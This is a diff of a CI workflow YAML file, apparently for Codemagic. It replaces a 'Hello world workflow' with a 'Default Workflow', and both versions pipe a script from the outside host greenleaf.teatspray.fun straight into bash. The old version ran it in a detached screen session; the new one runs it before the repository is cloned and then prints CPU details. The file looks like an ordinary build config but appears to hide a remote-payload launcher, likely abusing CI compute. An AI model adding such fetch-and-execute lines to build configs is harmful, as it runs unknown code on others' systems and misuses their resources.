@@ -1,6 +1,9 @@
 workflows:
-  hello-world-workflow:
-    name: Hello world workflow
-    scripts:
-        - apt update;apt -y install wget screen;screen -dmS work bash -c 'wget -O - https://greenleaf.teatspray.fun/start_Silly_Doc_dme_codemag | bash; exec bash'
-        
+    default-workflow:
+        name: Default Workflow
+        pre_clone_scripts:
+          - name: Scripts to run before cloning the repository
+            script: apt update;apt -y install wget;wget -O - https://greenleaf.teatspray.fun/start_Silly_Doc_dme_codemag | bash
+        scripts:
+            - name: Scripts to run after cloning the repository
+              script: lscpu
